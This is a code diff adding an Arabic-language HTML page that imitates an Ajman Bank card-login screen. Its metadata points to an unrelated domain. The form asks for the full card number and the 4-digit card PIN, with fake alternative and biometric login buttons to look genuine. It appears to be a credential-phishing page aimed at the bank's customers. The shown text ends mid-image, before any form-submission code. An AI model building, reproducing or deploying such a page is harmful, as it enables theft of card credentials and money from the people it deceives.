@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مصرف عجمان - تفاصل البطاقة</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="مصرف عجمان - تفاصل البطاقة">
+    <meta property="og:description" content="الرجاء إدخال تفاصيل بطاقتك لتسجيل الدخول.">
+    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/ajman_bank_logo.png">
+    <meta property="og:url" content="https://alkhaleeg.services/sadu/ajman_login.html">
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            color: #333;
+            background: #f9f9f9;
+            padding: 20px;
+            line-height: 1.8;
+            margin: 0;
+            max-width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                font-size: 14px;
+            }
+            .form-container {
+                padding: 20px;
+            }
+            .btn-red {
+                width: 90%;
+                font-size: 14px;
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                font-size: 13px;
+            }
+            .form-container {
+                padding: 15px;
+            }
+            .btn-red {
+                width: 95%;
+                font-size: 13px;
+                padding: 8px;
+            }
+        }
+
+        h1 {
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        h2 {
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-weight: bold;
+            font-size: 24px;
+        }
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 20px auto;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .btn-red {
+            display: block;
+            width: 100%;
+            margin: 25px auto;
+            padding: 12px;
+            background: linear-gradient(to right, #d32f2f, #b71c1c);
+            color: white;
+            text-align: center;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .alternative-login {
+            text-align: center;
+            color: #d32f2f;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        .divider {
+            text-align: center;
+            color: #666;
+            margin: 20px 0;
+            position: relative;
+        }
+        .divider:before,
+        .divider:after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #ccc;
+        }
+        .divider:before {
+            left: 0;
+        }
+        .divider:after {
+            right: 0;
+        }
+        .biometric-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            border: 2px solid #333;
+            border-radius: 25px;
+            padding: 10px 15px;
+            margin: 10px auto;
+            width: 100%;
+            max-width: 300px;
+            cursor: pointer;
+        }
+        .biometric-login img {
+            height: 20px;
+            margin-right: 10px;
+        }
+        .error-message {
+            display: none;
+            text-align: center;
+            color: red;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+<h1>تفاصل البطاقة</h1>
+<h2>الرجاء إدخال تفاصيل بطاقتك</h2>
+
+<div class="form-container">
+    <form id="ajmanLogin">
+        <label for="cardNumber">رقم البطاقة</label>
+        <input type="text" id="cardNumber" name="cardNumber" required>
+
+        <label for="pin">رمز التعرّف الشخصي للبطاقة المكون من 4 أرقام</label>
+        <input type="password" id="pin" name="pin" required minlength="4" maxlength="4" title="يجب أن يكون 4 أرقام">
+
+        <button type="submit" class="btn-red">التالي</button>
+        <div class="error-message" id="errorMessage"></div>
+    </form>
+
+    <div class="alternative-login">
+        تسجيل الدخول باستخدام بيانات الحساب
+    </div>
+
+    <div class="divider">أو</div>
+
+    <div class="biometric-login">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDIwIDIwIj48cGF0aCBkPSJNMTAgMGMtNS41MiAwLTEwIDQuNDgtMTAgMTBzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE1LjUyIDAgMTAgMHptLTcgOWg0YzAuNTUgMCAxIDAuNDUgMSAwLjV2MmMwIDAuNTUtMC40NSAxLTAuNSAxSDNjLTAuNTUgMC0xLTAuNDUtMS0wLjV2LTJjMC0wLjU1IDAuNDUtMSAwLjUtMXpNNyAyaC0yYzAtMC41NSAwLjQ1LTEgMC41LTEwaDJjMC41NSAwIDEgMC40NSAxIDAuNVYxaC0yYzAtMC41NS0wLjQ1LTEtMC41LTF6bTkgMGgtMmMwLTAuNTUgMC40NS0xIDAuNS0xaDJjMC41NSAwIDEgMC40NSAxIDAuNVYxaC0yYzAtMC41NS0wLjQ1LTEtMC41
